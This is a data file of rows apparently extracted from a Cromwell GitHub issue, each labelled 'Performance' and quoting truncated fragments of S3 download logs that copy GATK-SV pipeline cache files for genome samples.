Performance,"64-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-81/cacheCopy/SR00c.HG03449.txt.gz; 1608596946491,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-94/cacheCopy/SR00c.HG03789.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-94/cacheCopy/SR00c.HG03789.txt.gz.tbi; 1608596949182,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-71/cacheCopy/SR00c.HG02953.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-71/cacheCopy/SR00c.HG02953.txt.gz; 1608596952115,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-57/cacheCopy/SR00c.HG02332.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:2564,cache,cacheCopy,2564,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"64-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-85/cacheCopy/SR00c.HG03604.txt.gz; 1608597038611,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-64/cacheCopy/SR00c.HG02588.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-64/cacheCopy/SR00c.HG02588.txt.gz.tbi; 1608597040452,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-74/cacheCopy/SR00c.HG03085.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-74/cacheCopy/SR00c.HG03085.txt.gz.tbi; 1608597042942,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-73/cacheCopy/SR00c.HG03009.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4e",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:27496,cache,cacheCopy,27496,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"64-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-94/cacheCopy/SR00c.HG03789.txt.gz; 1608597594378,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-71/cacheCopy/SR00c.HG02953.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-71/cacheCopy/SR00c.HG02953.txt.gz.tbi; 1608597597343,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-130/cacheCopy/SR00c.NA19377.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-130/cacheCopy/SR00c.NA19377.txt.gz; 1608597600688,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-116/cacheCopy/SR00c.NA18638.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:182344,cache,cacheCopy,182344,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"64-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-95/cacheCopy/SR00c.HG03850.txt.gz; 1608597268460,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-85/cacheCopy/SR00c.HG03604.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-85/cacheCopy/SR00c.HG03604.txt.gz.tbi; 1608597270319,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-23/cacheCopy/SR00c.HG01275.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-23/cacheCopy/SR00c.HG01275.txt.gz.tbi; 1608597272885,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-107/cacheCopy/SR00c.NA12489.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:90455,cache,cacheCopy,90455,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"64-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-98/cacheCopy/SR00c.HG03888.txt.gz; 1608597434353,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-26/cacheCopy/SR00c.HG01356.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-26/cacheCopy/SR00c.HG01356.txt.gz.tbi; 1608597435583,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-148/cacheCopy/SR00c.NA20752.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-148/cacheCopy/SR00c.NA20752.txt.gz.tbi; 1608597438407,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-115/cacheCopy/SR00c.NA18560.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:135989,cache,cacheCopy,135989,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-103/cacheCopy/SR00c.NA06984.txt.gz.tbi; 1608597167270,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-152/cacheCopy/SR00c.NA20869.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-152/cacheCopy/SR00c.NA20869.txt.gz; 1608597169668,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-47/cacheCopy/SR00c.HG02019.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-47/cacheCopy/SR00c.HG02019.txt.gz; 1608597172290,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-49/cacheCopy/SR00c.HG02069.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:63043,cache,cacheCopy,63043,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-104/cacheCopy/SR00c.NA10847.txt.gz; 1608597419738,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-1/cacheCopy/SR00c.HG00096.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-1/cacheCopy/SR00c.HG00096.txt.gz.tbi; 1608597421803,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-123/cacheCopy/SR00c.NA19035.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-123/cacheCopy/SR00c.NA19035.txt.gz.tbi; 1608597424089,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-25/cacheCopy/SR00c.HG01344.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:131618,cache,cacheCopy,131618,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-107/cacheCopy/SR00c.NA12489.txt.gz.tbi; 1608597548876,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-135/cacheCopy/SR00c.NA19679.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-135/cacheCopy/SR00c.NA19679.txt.gz; 1608597550096,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-69/cacheCopy/SR00c.HG02658.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-69/cacheCopy/SR00c.HG02658.txt.gz.tbi; 1608597552897,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-141/cacheCopy/SR00c.NA20126.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4e",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:170534,cache,cacheCopy,170534,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-11/cacheCopy/SR00c.HG00375.txt.gz.tbi; 1608597021127,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-134/cacheCopy/SR00c.NA19678.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-134/cacheCopy/SR00c.NA19678.txt.gz; 1608597023863,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-126/cacheCopy/SR00c.NA19143.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-126/cacheCopy/SR00c.NA19143.txt.gz; 1608597026409,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-3/cacheCopy/SR00c.HG00140.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:23144,cache,cacheCopy,23144,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-112/cacheCopy/SR00c.NA18539.txt.gz; 1608597458007,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-3/cacheCopy/SR00c.HG00140.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-3/cacheCopy/SR00c.HG00140.txt.gz.tbi; 1608597459482,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-67/cacheCopy/SR00c.HG02642.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-67/cacheCopy/SR00c.HG02642.txt.gz.tbi; 1608597462345,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-51/cacheCopy/SR00c.HG02186.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4e",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:142849,cache,cacheCopy,142849,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-118/cacheCopy/SR00c.NA18941.txt.gz.tbi; 1608597141037,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-142/cacheCopy/SR00c.NA20320.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-142/cacheCopy/SR00c.NA20320.txt.gz; 1608597144746,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-11/cacheCopy/SR00c.HG00375.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-11/cacheCopy/SR00c.HG00375.txt.gz; 1608597146753,download: 